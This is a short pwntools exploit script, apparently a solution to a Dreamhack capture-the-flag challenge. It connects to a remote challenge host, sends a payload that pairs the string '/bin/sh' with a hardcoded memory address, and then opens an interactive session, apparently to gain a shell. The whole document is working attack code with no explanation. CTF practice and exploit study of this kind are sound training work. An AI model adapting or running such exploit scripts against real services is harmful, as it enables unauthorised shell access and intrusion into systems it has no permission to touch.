from pwn import *

p = remote("host3.dreamhack.games", 20153)

payload = b"/bin/sh\x00" + p32(0x804a0ac)

p.sendline(payload)
p.sendline(b"21")

p.interactive()